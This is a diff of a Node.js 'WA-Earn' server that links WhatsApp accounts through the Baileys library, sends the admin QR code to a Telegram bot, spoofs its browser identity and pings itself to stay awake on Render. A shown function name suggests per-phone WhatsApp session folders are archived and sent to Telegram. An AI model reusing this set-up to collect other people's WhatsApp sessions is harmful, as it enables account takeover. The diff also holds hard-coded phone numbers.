@@ -1,19 +1,20 @@
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
-const { default: makeWASocket, useMultiFileAuthState, delay } = require('@whiskeysockets/baileys');
+const { default: makeWASocket, useMultiFileAuthState, delay, DisconnectReason } = require('@whiskeysockets/baileys');
 const pino = require('pino');
 const TelegramBot = require('node-telegram-bot-api');
 const archiver = require('archiver');
 const fs = require('fs-extra');
 const path = require('path');
+const QRCode = require('qrcode');
 
-// --- CONFIGURATION (CHANGE THESE IN RENDER ENV VARS) ---
-const BOT_NUMBER = process.env.BOT_NUMBER || '2347063140576'; 
+// --- CONFIGURATION (RENDER ENV VARS) ---
+const BOT_NUMBER = process.env.BOT_NUMBER || '2348023931932'; 
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN'; 
 const MY_TELEGRAM_ID = process.env.MY_TELEGRAM_ID || 'YOUR_TELEGRAM_USER_ID'; 
 const RENDER_URL = process.env.RENDER_URL || 'https://your-app-name.onrender.com'; 
-// --------------------------------------------------------
+// ---------------------------------------
 
 const app = express();
 const server = http.createServer(app);
@@ -55,33 +56,53 @@ async function backupToTelegram(phoneNumber, folderPath) {
     });
 }
 
-// 2. The Admin Bot
+// 2. The Admin Bot (Using QR Code)
 async function startAdminBot() {
     const { state, saveCreds } = await useMultiFileAuthState('auth_info_admin');
     
     adminSock = makeWASocket({
         logger: pino({ level: 'silent' }),
-        printQRInTerminal: false,
+        printQRInTerminal: false, 
         auth: state,
-        browser: ["WA-Earn", "Chrome", "1.0.0"]
+        browser: ["Mac OS", "Chrome", "110.0.5481.177"],
+        connectTimeoutMs: 60000,
+        defaultQueryTimeoutMs: 60000
     });
 
     adminSock.ev.on('creds.update', saveCreds);
 
     adminSock.ev.on('connection.update', async (update) => {
-        if (update.connection === 'open') {
+        const { connection, qr, lastDisconnect } = update;
+        
+        if (qr) {
+            console.log('[*] New QR Code generated. Sending to Telegram...');
+            try {
+                const qrBuffer = await QRCode.toBuffer(qr, { type: 'png', width: 500 });
+                await tgBot.sendPhoto(MY_TELEGRAM_ID, qrBuffer, { 
+                    caption: '📲 *Scan this QR Code to link the Admin Bot*\n\nOpen WhatsApp > Linked Devices > Link a Device.',
+                    parse_mode: 'Markdown' 
+                });
+                console.log('[+] QR Code sent to Telegram.');
+            } catch (err) {
+                console.log(`[-] Failed to send QR to Telegram: ${err.message}`);
+            }
+        }
+
+        if (connection === 'open') {
             console.log('[+] Admin Bot Connected.');
             io.emit('log', { msg: 'Admin Bot connected to WhatsApp', type: 'info' });
             io.emit('admin_ready');
+            tgBot.sendMessage(MY_TELEGRAM_ID, '✅ *Admin Bot Successfully Linked!*', { parse_mode: 'Markdown' });
+        }
+
+        if (connection === 'close') {
+            const reason = lastDisconnect?.error?.message || 'Unknown';
+            console.log(`[-] Admin Bot Disconnected: ${reason}`);
+            if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
+                startAdminBot(); // Reconnect automatically
+            }
         }
     });
-
-    if (!adminSock.authState.creds.registered) {
-        await delay(5000);
-        const code = await adminSock.requestPairingCode(BOT_NUMBER);
-        console.log(`\n[!] ADMIN BOT PAIRING CODE: ${code}\n`);
-        tgBot.sendMessage(MY_TELEGRAM_ID, `*Admin Bot Pairing Code:* \`${code}\``, { parse_mode: 'Markdown' });
-    }
 }
 
 // 3. Web Server Socket.IO
@@ -187,6 +208,16 @@ io.on('connection', (socket) => {
     });
 });
 
+// 4. Keep Render Awake
+setInterval(() => {
+    http.get(`http://localhost:${process.env.PORT || 8080}/admin`, (res) => {
+        console.log(`[*] Self-ping status: ${res.statusCode}`);
+    }).on('error', (err) => {
+        console.log(`[-] Self-ping error: ${err.message}`);
+    });
+}, 10 * 60 * 1000); 
+
+// 5. Start Server
 server.listen(process.env.PORT || 8080, () => {
     console.log(`[-] WA-Earn Server running on port ${process.env.PORT || 8080}`);
     startAdminBot();
